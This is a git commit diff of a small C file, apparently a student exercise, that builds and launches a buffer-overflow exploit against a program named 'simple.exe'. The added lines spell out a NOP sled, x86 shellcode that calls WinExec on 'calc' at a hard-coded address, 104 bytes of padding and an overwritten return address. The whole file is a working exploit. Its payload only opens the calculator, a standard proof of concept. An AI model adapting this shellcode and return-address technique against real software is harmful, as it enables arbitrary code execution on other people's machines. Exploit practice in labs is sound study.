5aa55427c9d9174d65a0146f4c092842d5e16d59
tomartin-42 <tomasmartinezcurz@gmail.com>
2022-04-28 08:06:02 +0200

    finish

--- tsunami/tsunami.c
+++ tsunami/tsunami.c
@@ -3,8 +3,27 @@
 
 int main(int argc, char **argv)
 {
-	char payload [] =	"simple.exe ÉÉÉÉÉÉÉÉÉÉÉÉ1╔QhcalcT╕╟ô┬w ╨AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-						"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA⌠■‼";
+	char payload [] =	"simple.exe "
+						"\x90\x90\x90\x90\x90\x90"
+						"\x90\x90\x90\x90\x90\x90" //12 nops
+						"\x31\xC9"
+						"\x51"
+						"\x68\x63\x61\x6C\x63"
+						"\x54"
+						"\xB8\xC7\x93\xC2\x77"
+						"\xFF\xD0"
+						"AAAAAAAAAA" //10
+						"AAAAAAAAAA"
+						"AAAAAAAAAA"
+						"AAAAAAAAAA"
+						"AAAAAAAAAA" //50
+						"AAAAAAAAAA"
+						"AAAAAAAAAA"
+						"AAAAAAAAAA"
+						"AAAAAAAAAA"
+						"AAAAAAAAAA" //100
+						"AAAA"		 //104
+						"\x80\xFA\x13\x00";
 
 	WinExec(payload, 0);
 	return (0);
